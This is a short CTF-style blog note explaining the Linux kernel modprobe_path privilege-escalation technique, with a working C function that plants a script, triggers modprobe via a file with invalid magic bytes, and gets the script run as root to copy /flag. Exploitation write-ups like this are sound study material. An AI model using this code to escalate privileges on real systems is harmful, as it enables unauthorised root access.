---
date: '2025-01-14T19:30:00Z'
draft: false
title: 'Kpwn tecniques: modprobe_path'
summary: "modprobe_path is a global variable that in most kernels is RW. This variable is contains a path to an executable, do you see where this is going..?"

categories: ["Docs"]
tags: ["kernel"]
author: "leo_something"
---

## Modbprobe path

When a binary with unknown magic bytes/shebang gets executed the kernel tries to load a module to handle that binary type.

To load this module it uses modprobe, whose path is stored in a **kernel global variable** called `modprobe_path`, which is RW (there are actually some mitigations for this).

Modprobe is **executed as root** using this path. 

If we have an arbitrary write primitive we can trick the kernel into running our own binary/script as root.

#### Exploitation
Write in `modeprobe_path` the path of your binary/script (this should be `<path>/x`).

Then call this function to automate the rest:
```c
void modprobe(char* path){
  int size = strlen(path) + 0x20;
  char flag_dest[size];
  char flag[size];
  char trigger[size];
  char modprobe_sh_script[size];

  snprintf(flag_dest, size, "%s/flag_dest", path);
  snprintf(modprobe_sh_script, size, "%s/x", path);
  snprintf(flag, size, "/flag");
  snprintf(trigger, size, "%s/b", path);


    const char format[102] = {"touch %s;"
        "echo -e '#!/bin/sh\ncat %s > %s' > %s;"
        "echo -e '\xff\xff\xff\xff' > %s;"
        "chmod +x %s; chmod +x %s;"

        "%s;"
        "cat %s;"
    };

    char cmd[sizeof(format) + size*9];

    snprintf(cmd, sizeof(cmd), format, flag_dest, flag, flag_dest, modprobe_sh_script, trigger, modprobe_sh_script, trigger, trigger, flag_dest);
    system(cmd);
}
```
**NOTE:** `path` must be a directory writeable by your user

This function executed the following commands:
- Writes our sh script `<path>/x`
	- the script cats the flag inside a file (`<path>/flag_dest`) readable by the unprivileged user
- Creates a "binary" with unknown magic bytes (0xffffffff)
- Makes our script and the "invalid binary" executable
- Executes the "invalid binary", triggering the use of `modprobe_path`, which is set to our sh script (`<path>/x`). This executes our script with root privileges, the script in turn reads the flag and writes it to a readable location (`<path>/flag_dest`).
- Print the flag from `<path>/flag_dest`

## Useful links
- https://sam4k.com/like-techniques-modprobe_path/